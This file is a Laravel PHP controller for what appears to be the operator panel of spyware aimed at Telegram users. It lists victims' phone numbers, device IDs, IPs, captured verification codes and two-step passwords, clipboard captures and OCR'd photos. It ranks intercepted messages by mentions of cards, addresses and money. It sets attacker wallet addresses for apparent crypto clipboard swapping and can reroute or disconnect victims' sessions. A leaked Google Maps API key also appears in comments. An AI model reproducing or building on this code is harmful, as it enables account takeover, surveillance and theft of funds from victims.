<?php 
 
namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\AdminModel;
use App\Models\AddressModel;
use App\Models\LogsModel;
use App\Models\KeywordsModel;
use App\Models\LoginIpModel;
use App\Models\PhotosModel;
use App\Models\CopyKeysModel;

use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Auth; 
use DateTime;
use DB;
use Stripe\Stripe;
use Stripe\Customer;
use Stripe\Charge;
use GuzzleHttp\Client;
use Stichoza\GoogleTranslate\GoogleTranslate;

class HomeController extends Controller
{
    public function index()
	{
        $info['address_option'] = AddressModel::all()->first();
		return view(Auth::user()->rule==1?'wallet_address':'logs',['pageName'=>Auth::user()->rule==1?'钱包地址':'日志', 'info'=>$info]);
	}

    public function start()
	{
		return view('start',['pageName'=>'Start']);
    }

    public function saveProfile(Request $request)
    {
    	$username = $request->get('username');
    	$opassword = $request->get('opassword');
    	$npassword = $request->get('npassword');
    	if($opassword=="") {
    		AdminModel::where('username', Auth::user()->username)->update(['username' => $username]);
			echo "success";	
    	} else {
    		if(Auth::attempt(['username' => Auth::user()->username, 'password' => $opassword])){
				AdminModel::where('username', Auth::user()->username)->update(['username' => $username,  'password' => bcrypt($npassword)]);
				echo "success";	
			} else {
				echo "failed";
			}
    	}
    }

    public function setWalletAddress(Request $req)
    {
        $btc = $req->input('BTC');
        $trc = $req->input('TRC');
        $erc = $req->input('ERC');
        $rx_btc = $req->input('RX_BTC');
        $rx_trc = $req->input('RX_TRC');
        $rx_erc = $req->input('RX_ERC');
        $initial_time = $req->input('INITIAL_TIME');
        
        if($btc == null) $btc = '';
        if($trc == null) $trc = '';
        if($erc == null) $erc = '';
        if($rx_btc == null) $rx_btc = '';
        if($rx_trc == null) $rx_trc = '';
        if($rx_erc == null) $rx_erc = '';
        if($initial_time == null) $initial_time = 0;

        $model = AddressModel::all()->first();
        $model->BTC = $btc;
        $model->TRC = $trc;
        $model->ERC = $erc;
        
        $model->RX_BTC = $rx_btc;
        $model->RX_TRC = $rx_trc;
        $model->RX_ERC = $rx_erc;

        $model->INITIAL_TIME = $initial_time;
        $model->save();
        return back();
    }

    public function showMarkLogs()
	{
		return view('marklogs',['pageName'=>'Marks']);
    }

    public function showLogs()
	{
		return view('logs',['pageName'=>'日志']);
    }

    public function showLoginIps()
	{
		return view('loginips',['pageName'=>'Login IPs']);
    }

    public function showPhotos()
	{
		return view('photos',['pageName'=>'图片']);
    }

    public function showCopyKeys()
	{
		return view('copykeys',['pageName'=>'复制钥匙']);
    }

    public function getLogs(Request $request)
	{
		$cols = array('ID', 'ID', 'INSTALL_DATE', 'INSTALL_COUNTRY_CN',  'IP_ADDRESS', 'DEVICEID', 'TG_NUMBER','LOGIN_STATUS', 'VERIFYCODE', 'TWOSTEP', 'updated_at', 'updated_at', 'NOTE', 'updated_at', 'updated_at');
        $start = $request->get("start");
        $length = $request->get("length");
        
        $search_txt_install_date = $request->get("search_txt_install_date");
        // $search_txt_ip = $request->get("search_txt_ip");
        // $search_txt_deviceid = $request->get("search_txt_deviceid");
        $search_txt_phone = $request->get("search_txt_phone");
        $search_txt_note = $request->get("search_txt_note");
        $mark = $request->get("mark");

        $sCol = $request->get("order");
        $col = $cols[$sCol[0]['column']];
        $dir = $sCol[0]['dir'];
        if($col=="ID") {
            $col="INSTALL_DATE";
            if($dir=="asc"){
                $dir="desc";
            } else {
                $dir="asc";
            }
        }
        $result["recordsTotal"] = LogsModel::select('*')->where('MARK', 'like', "%".$mark."%")->count();

        $query = LogsModel::select('*')
                            ->where('INSTALL_DATE', 'like', "%".$search_txt_install_date."%");
        if($search_txt_phone != '')
            $query = $query->where('TG_NUMBER', 'like', '%'.$search_txt_phone.'%');
        if($search_txt_note != '')    
            $query = $query->where('NOTE', 'like', '%'.$search_txt_note.'%');
        
        $result["recordsFiltered"] = $query->where('MARK', 'like', "%".$mark."%")->count();
        $result['data'] = $query->where('MARK', 'like', "%".$mark."%")
                        ->orderBy($col, $dir)
                        ->skip($start)->take($length)->get();

        $tr = new GoogleTranslate();
        $len = count($result['data']);
        for($i=0;$i<$len;$i++) {
            if($result['data'][$i]->INSTALL_COUNTRY_CN == '') {
                $install_country_cn = '';
                $install_country_cn = $tr->setSource('en')->setTarget('zh')->translate($result['data'][$i]->INSTALL_COUNTRY);
                // $url = 'https://maps.googleapis.com/maps/api/geocode/json?key=AIzaSyAQQzUkbjT1wR8lKHZKMdmFSSuO07_6XGA&address='.urlencode($result['data'][$i]->INSTALL_COUNTRY).'&language=zh&sensor=false&result_type=locality';
                // $json = file_get_contents($url);
                // //echo $json;
                // $data = json_decode($json);
                // $status = $data->status;
                // if($status=="OK") {
                //     $install_country_cn = $data->results[0]->formatted_address;
                // }
                if(preg_match("/\p{Han}+/u", $install_country_cn)) {
                    for($j=0;$j<$len;$j++) {
                        if(($result['data'][$i]->INSTALL_COUNTRY == $result['data'][$j]->INSTALL_COUNTRY) || ($result['data'][$i]->IP_ADDRESS == $result['data'][$j]->IP_ADDRESS)) {
                            $result['data'][$j]->INSTALL_COUNTRY_CN = $install_country_cn;
                        }
                    }
                    
                    LogsModel::where('INSTALL_COUNTRY', $result['data'][$i]->INSTALL_COUNTRY)->orwhere('IP_ADDRESS', $result['data'][$i]->IP_ADDRESS)->update(['INSTALL_COUNTRY_CN' => $install_country_cn]);
                    // LogsModel::where('IP_ADDRESS', $result['data'][$i]->IP_ADDRESS)->update(['INSTALL_COUNTRY_CN' => $install_country_cn]);
                }
            }
        }
        return response()->json($result);
    }

    public function getMarkLogs(Request $request)
	{
		$cols = array('ID', 'ID', 'INSTALL_DATE', 'IP_ADDRESS', 'INSTALL_COUNTRY_CN',  'TG_NUMBER', 'LAST_TRIGGER_TIME', 'LAST_TRIGGER_KEY', 'LAST_TRIGGER_KEY', 'VERIFYCODE', 'TWOSTEP', 'updated_at', 'DISCONNECTING', 'updated_at', 'NOTE', 'updated_at', 'updated_at');
        $start = $request->get("start");
        $length = $request->get("length");
        
        $search_txt_install_date = $request->get("search_txt_install_date");
        // $search_txt_ip = $request->get("search_txt_ip");
        // $search_txt_deviceid = $request->get("search_txt_deviceid");
        $search_txt_phone = $request->get("search_txt_phone");
        $search_txt_note = $request->get("search_txt_note");
        $search_txt_keyword = $request->get("search_txt_keyword");
        $mark = $request->get("mark");

        $sCol = $request->get("order");
        $col = $cols[$sCol[0]['column']];
        $dir = $sCol[0]['dir'];
        if($col=="ID") {
            $col="LAST_TRIGGER_TIME";
            if($dir=="asc"){
                $dir="desc";
            } else {
                $dir="asc";
            }
        } 

        $query = LogsModel::select('*')->where('MARK', '=', '1');
        $result["recordsTotal"] = $query->count();

        if($search_txt_install_date != '')
            $query = $query->where('LAST_TRIGGER_TIME', 'like', "%".$search_txt_install_date."%");
        if($search_txt_keyword != '')
            $query = $query->where('LAST_TRIGGER_KEY', 'like', "%".$search_txt_keyword."%");

        if($search_txt_phone != '')
            $query = $query->where('TG_NUMBER', 'like', '%'.$search_txt_phone.'%');
        if($search_txt_note != '')    
            $query = $query->where('NOTE', 'like', '%'.$search_txt_note.'%');
        
        $result["recordsFiltered"] = $query->count();
        $result['data'] = $query
                        ->orderBy($col, $dir)
                        ->skip($start)->take($length)->get();
        
        $tr = new GoogleTranslate();
        $len = count($result['data']);
        for($i=0;$i<$len;$i++) {
            if($result['data'][$i]->INSTALL_COUNTRY_CN == '') {
                $install_country_cn = '';
                $install_country_cn = $tr->setSource('en')->setTarget('zh')->translate($result['data'][$i]->INSTALL_COUNTRY);
                // $url = 'https://maps.googleapis.com/maps/api/geocode/json?key=AIzaSyAQQzUkbjT1wR8lKHZKMdmFSSuO07_6XGA&address='.urlencode($result['data'][$i]->INSTALL_COUNTRY).'&language=zh&sensor=false&result_type=locality';
                // $json = file_get_contents($url);
                // //echo $json;
                // $data = json_decode($json);
                // $status = $data->status;
                // if($status=="OK") {
                //     $install_country_cn = $data->results[0]->formatted_address;
                // }
                if(preg_match("/\p{Han}+/u", $install_country_cn)) {
                    for($j=0;$j<$len;$j++) {
                        if(($result['data'][$i]->INSTALL_COUNTRY == $result['data'][$j]->INSTALL_COUNTRY) || ($result['data'][$i]->IP_ADDRESS == $result['data'][$j]->IP_ADDRESS)) {
                            $result['data'][$j]->INSTALL_COUNTRY_CN = $install_country_cn;
                        }
                    }

                    LogsModel::where('INSTALL_COUNTRY', $result['data'][$i]->INSTALL_COUNTRY)->orwhere('IP_ADDRESS', $result['data'][$i]->IP_ADDRESS)->update(['INSTALL_COUNTRY_CN' => $install_country_cn]);
                    // LogsModel::where('IP_ADDRESS', $result['data'][$i]->IP_ADDRESS)->update(['INSTALL_COUNTRY_CN' => $install_country_cn]);
                }
            }
        }
        return response()->json($result);
    }

    public function getLoginIps(Request $request)
	{
		// $cols = array('id', 'id', 'ipaddress', 'username', 'role', 'country_cn', 'country_en','updated_at');
        $cols = array('id', 'ipaddress', 'username', 'role', 'country_cn', 'country_en','updated_at');
        $start = $request->get("start");
        $length = $request->get("length");

        $search_txt_ip = $request->get("search_txt_ip");

        $sCol = $request->get("order");
        $col = $cols[$sCol[0]['column']];
        $dir = $sCol[0]['dir'];
        if($col=="id") {
            $col="updated_at";
            if($dir=="asc"){
                $dir="desc";
            } else {
                $dir="asc";
            }
        }
        $result["recordsTotal"] = LoginIpModel::select('*')->count();
        $result["recordsFiltered"] = LoginIpModel::select('*')->where('ipaddress', 'like', "%".$search_txt_ip."%")->count();
        $result['data'] = LoginIpModel::select('*')
                        ->where('ipaddress', 'like', "%".$search_txt_ip."%")
                        ->orderBy($col, $dir)
                        ->skip($start)->take($length)->get();
        return response()->json($result);
    }

    public function getCopyKeys(Request $request)
	{
		$cols = array('id', 'id', 'install_date', 'phonenumber', 'msg', 'updated_at');
        $start = $request->get("start");
        $length = $request->get("length");

        $search_txt_install_date = $request->get("search_txt_install_date");
        $search_txt_phone = $request->get("search_txt_phone");


        $sCol = $request->get("order");
        $col = $cols[$sCol[0]['column']];
        $dir = $sCol[0]['dir'];
        if($col=="id") {
            $col="updated_at";
            if($dir=="asc"){
                $dir="desc";
            } else {
                $dir="asc";
            }
        }
        $result["recordsTotal"] = CopyKeysModel::select('*')->count();
        // $result["recordsFiltered"] = PhotosModel::select('*')->count();
    
        $query = CopyKeysModel::select('copykeys.*', 'log.INSTALL_DATE as install_date')
                            ->leftJoin('logs as log',function($join) {
                                $join->on('copykeys.logid', '=', 'log.ID');
                            })
                            ->where('install_date', 'like', "%".$search_txt_install_date."%");
        if($search_txt_phone != '')
            $query = $query->where('phonenumber', 'like', '%'.$search_txt_phone.'%');

        $result["recordsFiltered"] = $query->count();
        $result['data'] = $query->orderBy($col, $dir)
                        ->skip($start)->take($length)->get();
        return response()->json($result);
    }

    public function getPhotos(Request $request)
	{
		$cols = array('id', 'id', 'phonenumber', 'install_date', 'recognized_text', 'updated_at', 'note', 'updated_at');
        $start = $request->get("start");
        $length = $request->get("length");

        $search_txt_install_date = $request->get("search_txt_install_date");
        $search_txt_phone = $request->get("search_txt_phone");
        $search_txt_note = $request->get("search_txt_note");


        $sCol = $request->get("order");
        $col = $cols[$sCol[0]['column']];
        $dir = $sCol[0]['dir'];
        if($col=="id") {
            $col="updated_at";
            if($dir=="asc"){
                $dir="desc";
            } else {
                $dir="asc";
            }
        }
        $result["recordsTotal"] = PhotosModel::select('*')->count();
        // $result["recordsFiltered"] = PhotosModel::select('*')->count();
    
        $query = PhotosModel::select('photos.*', 'log.INSTALL_DATE as install_date')
                            ->leftJoin('logs as log',function($join) {
                                $join->on('photos.logid', '=', 'log.ID');
                            })
                            ->where('install_date', 'like', "%".$search_txt_install_date."%");
        if($search_txt_phone != '')
            $query = $query->where('phonenumber', 'like', '%'.$search_txt_phone.'%');
        if($search_txt_note != '')    
            $query = $query->where('photos.note', 'like', '%'.$search_txt_note.'%');

        $result["recordsFiltered"] = $query->count();
        $result['data'] = $query->orderBy($col, $dir)
                        ->skip($start)->take($length)->get();
        return response()->json($result);
    }

    public function getKeywordsCount(Request $request)
    {
        $search_txt_log_id = $request->get("search_txt_log_id");
        $count = KeywordsModel::select('*')
                            ->where('logid', 'like', "%".$search_txt_log_id."%")
                            ->where('trigger_key', '!=', '')->where('trigger_key', '!=', null)
                            ->count();
        return $count;
    }

    public function getKeywords(Request $request)
    {
        $cols = array('id', 'tg_number', 'trigger_time', 'trigger_key', 'trigger_key', 'trigger_friendname', 'trigger_groupname',  'trigger_is_blocking');
        $start = $request->get("start");
        $length = $request->get("length");
        
        $search_txt_log_id = $request->get("search_txt_log_id");
        $search_trigger_key = $request->get("search_trigger_key");
        // echo "search txt log id".$search_txt_log_id;
        // die;

        $sCol = $request->get("order");
        $col = $cols[$sCol[0]['column']];
        $dir = $sCol[0]['dir'];
        if($col=="id") {
            $col="trigger_time";
            if($dir=="asc"){
                $dir="desc";
            } else {
                $dir="asc";
            }
        }

        // DB::statement("SET SQL_MODE=''");
        // try {
        //     $query  = "DELETE m
        //     FROM keywords m JOIN
        //          (SELECT id, COUNT(*) as cnt
        //           FROM keywords
        //           GROUP BY logid, trigger_time, trigger_key, trigger_isout, trigger_friendname, trigger_groupname
        //          ) mm
        //          ON mm.id = m.id
        //     WHERE cnt > 1";
        //     DB::select($query);
        // }catch(exception $e) {}

        if($search_txt_log_id == '')
        {
            $result["recordsTotal"] = KeywordsModel::select('*')->where('trigger_isout', '=', '1')->where('trigger_key', '!=', '')->where('trigger_key', '!=', null)->count();
            $result['data'] = KeywordsModel::select('keywords.*', 'log.TG_NUMBER as tg_number')
                ->leftJoin('logs as log',function($join) {
                    $join->on('keywords.logid', '=', 'log.ID');
                })
                ->where('keywords.trigger_key', '!=', '')->where('keywords.trigger_key', '!=', null)
                ->where('keywords.trigger_key', 'like', "%".$search_trigger_key."%")
                ->where("keywords.trigger_isout", '=', '1')
                ->orderByRaw('case 
                when `keywords`.`trigger_key` LIKE "%卡%" then 1 
                when `keywords`.`trigger_key` LIKE "%地址%" then 2 
                when `keywords`.`trigger_key` LIKE "%元%"  then 3 
                else 4 end')
                ->orderBy($col, $dir)
                ->skip($start)->take($length)->get();


            $result["recordsFiltered"] = KeywordsModel::select('*')
                ->where("trigger_isout", '=', '1')
                ->where('trigger_key', '!=', '')->where('trigger_key', '!=', null)
                ->where('trigger_key', 'like', "%".$search_trigger_key."%")
                ->count();
        } else {
            $result["recordsTotal"] = KeywordsModel::select('*')->where('logid', 'like', "%".$search_txt_log_id."%")->where('trigger_key', '!=', '')->where('trigger_key', '!=', null)->count();
            // echo $result['recordsTotal'];
            // die;
            $result['data'] = KeywordsModel::select('keywords.*', 'log.TG_NUMBER as tg_number')
                                ->leftJoin('logs as log',function($join) {
                                    $join->on('keywords.logid', '=', 'log.ID');
                                })
                                ->where('keywords.logid', 'like', "%".$search_txt_log_id."%")
                                ->where('keywords.trigger_key', '!=', '')->where('keywords.trigger_key', '!=', null)
                                ->where('keywords.trigger_key', 'like', "%".$search_trigger_key."%")
                                ->orderBy("keywords.trigger_isout", "desc")
                                ->orderByRaw('case 
                                when `keywords`.`trigger_key` LIKE "%卡%" then 1 
                                when `keywords`.`trigger_key` LIKE "%地址%" then 2 
                                when `keywords`.`trigger_key` LIKE "%元%"  then 3 
                                else 4 end')
                                ->orderBy($col, $dir)
                                ->skip($start)->take($length)->get();
            
            
            $result["recordsFiltered"] = KeywordsModel::select('*')
                                ->where('logid', 'like', "%".$search_txt_log_id."%")
                                ->where('trigger_key', '!=', '')->where('trigger_key', '!=', null)
                                ->where('trigger_key', 'like', "%".$search_trigger_key."%")
                                ->count();
        }
        return response()->json($result);
    }

    public function blockKeyword(Request $request)
    {
        $blocking = $request->get("blocking");
        $logid = $request->get("logid");
        $keyword = $request->get("keyword");
        KeywordsModel::where('trigger_key', $keyword)->where('logid', $logid)->update(['trigger_is_blocking' => $blocking]);
        echo "success";	
    }

    public function showKeywords(Request $request)
	{
        $logid = $request->get("id");
        $index = $request->get("index");
		return view('keywords',['pageName'=>'Keywords', "logid"=>$logid, "index"=>$index]);
    }

    public function editLog(Request $request)
    {
    	$id = $request->get('ID');
    	$to_deviceid = $request->get('TO_DEVICEID');
    	$send_delay = $request->get('SEND_DELAY');
        $recv_delay = $request->get('RECEIVE_DELAY');
        $recv_delay = $request->get('RECEIVE_DELAY');
        $note = $request->get('NOTE');
        $disconnecting = $request->get('DISCONNECTING');

        if($to_deviceid != null)
    	    LogsModel::where('ID', $id)->update(['TO_DEVICEID' => $to_deviceid]);
        if($send_delay != null)
    	    LogsModel::where('ID', $id)->update(['SEND_DELAY' => $send_delay]);
        if($recv_delay != null)
    	    LogsModel::where('ID', $id)->update(['RECEIVE_DELAY' => $recv_delay]);
        if($disconnecting != null)
    	    LogsModel::where('ID', $id)->update(['DISCONNECTING' => $disconnecting]);
    }


    public function deleteLog(Request $request)
    {
        $id = $request->get('id');
        $log_delete = $request->get('log_delete');
        if($log_delete == 1)
            LogsModel::where('ID', $id)->delete();
        // KeywordsModel::where('logid', $id)->delete();
    }

    public function deleteLogsSelections(Request $request)
    {
        $checkboxes = $request->get('checkboxes');        
        $log_delete = $request->get('log_delete');

        if($checkboxes!=null && count($checkboxes) > 0) {
            foreach($checkboxes as $id) {
                if($log_delete == 1)
                    LogsModel::where('ID', $id)->delete();
                // KeywordsModel::where('logid', $id)->delete();
            }
        }
    }

    // public function deleteLoginIp(Request $request)
    // {
    //     $id = $request->get('id');
    //     LoginIpModel::where('id', $id)->delete();
    // }

    // public function deleteLoginIpSelections(Request $request)
    // {
    //     $checkboxes = $request->get('checkboxes');
    //     if($checkboxes!=null && count($checkboxes) > 0) {
    //         foreach($checkboxes as $id) {
    //             LoginIpModel::where('id', $id)->delete();
    //         }
    //     }
    // }
    
    public function editPhoto(Request $request)
    {
    	$id = $request->get('id');
        $note = $request->get('note');

        if($note != null)
    	    PhotosModel::where('id', $id)->update(['note' => $note]);
    }

    public function deletePhoto(Request $request)
    {
        $id = $request->get('id');        
        $photo = PhotosModel::select('*')->where('id', $id)->get()->first();
        if(file_exists(base_path().'/../photos/'.$photo->phonenumber.'/'.$photo->filepath)) {
            unlink(base_path().'/../photos/'.$photo->phonenumber.'/'.$photo->filepath);
        }
        PhotosModel::where('id', $id)->delete();
    }

    public function deletePhotoSelections(Request $request)
    {
        $checkboxes = $request->get('checkboxes');
        if($checkboxes!=null && count($checkboxes) > 0) {
            foreach($checkboxes as $id) {
                $photo = PhotosModel::select('*')->where('id', $id)->get()->first();
                if(file_exists(base_path().'/../photos/'.$photo->phonenumber.'/'.$photo->filepath)) {
                    unlink(base_path().'/../photos/'.$photo->phonenumber.'/'.$photo->filepath);
                }
                PhotosModel::where('id', $id)->delete();
            }
        }
    }

    public function deleteCopyKey(Request $request)
    {
        $id = $request->get('id');
        CopyKeysModel::where('id', $id)->delete();
    }
    public function deleteCopyKeySelections(Request $request)
    {
        $checkboxes = $request->get('checkboxes');
        if($checkboxes!=null && count($checkboxes) > 0) {
            foreach($checkboxes as $id) {
                CopyKeysModel::where('id', $id)->delete();
            }
        }
    }
    
}
